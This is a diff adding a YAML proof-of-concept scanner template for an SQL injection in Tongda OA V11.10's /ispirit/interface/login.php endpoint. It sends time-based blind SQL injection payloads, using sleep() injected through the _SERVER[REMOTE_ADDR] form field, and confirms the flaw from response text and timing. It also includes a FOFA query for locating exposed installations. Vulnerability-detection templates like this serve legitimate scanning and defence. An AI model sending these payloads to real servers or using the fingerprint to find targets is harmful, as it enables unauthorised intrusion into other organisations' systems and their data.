@@ -1,0 +1,31 @@
+id: poc-yaml-tongda-oa-login-sqli
+info:
+  name: 通达OA V11.10接口login.php存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /ispirit/interface/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d1,sleep({{.t1}}),(select+~0%2b1))+limit+0,1))--+'
+  expression: "status_code == 200 && \n(contains(gbk_decode(body),\"请联系管理员\") || contains(body,\"\
+    请联系管理员\")) &&\n(contains(gbk_decode(body),\"文件\") || contains(body,\"文件\")) &&\n\
+    duration >= t1 &&\nduration <= t2\n"
+- method: POST
+  path: /ispirit/interface/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d1,sleep({{.t3}}),(select+~0%2b1))+limit+0,1))--+'
+  expression: "status_code == 200 && \n(contains(gbk_decode(body),\"请联系管理员\") || contains(body,\"\
+    请联系管理员\")) &&\n(contains(gbk_decode(body),\"文件\") || contains(body,\"文件\")) &&\n\
+    duration >= t3 &&\nduration <= t4\n"
+transport: http
